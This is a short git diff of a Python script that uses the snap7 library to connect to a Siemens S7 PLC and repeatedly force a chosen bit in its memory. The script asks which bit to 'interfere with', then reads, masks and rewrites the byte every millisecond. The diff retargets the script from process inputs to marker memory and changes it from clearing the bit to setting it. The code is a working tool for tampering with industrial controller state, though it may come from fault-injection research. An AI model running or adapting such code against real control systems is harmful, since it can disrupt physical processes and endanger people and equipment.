@@ -41,7 +41,7 @@ whatBit = inputFail(input("Which Bit do you want to interfere with? \n"), 1)
 # CT = 0x1C -> Counter
 # TM = 0x1D -> Timer
     
-area = snap7.types.Areas.PE
+area = snap7.types.Areas.MK
 numberOfUnits = 1
 wordLength = WordLen.Byte
 
@@ -73,11 +73,12 @@ def writeFlippedBit():
         with suppress(RuntimeError): 
             readBytes = plc.read_area(area, 0, startByte, numberOfUnits)
             currentByte[0] = readBytes[0]
-            currentByte[0] = mask0 & currentByte[0]
-            # currentByte[0] = mask1 | currentByte[0]
+            # currentByte[0] = mask0 & currentByte[0]
+            currentByte[0] = mask1 | currentByte[0]
             plc.write_area(area, 0, startByte, bytearray([currentByte[0]]))
+            # plc.as_write_area(area, 0, startByte, numberOfUnits, WordLen.Byte, bytearray([currentByte[0]]))
             # print(currentByte[0])
-            time.sleep(0.0001)  
+            time.sleep(0.001)  
             
 if(str(ready) != "y"):
     sys.exit()
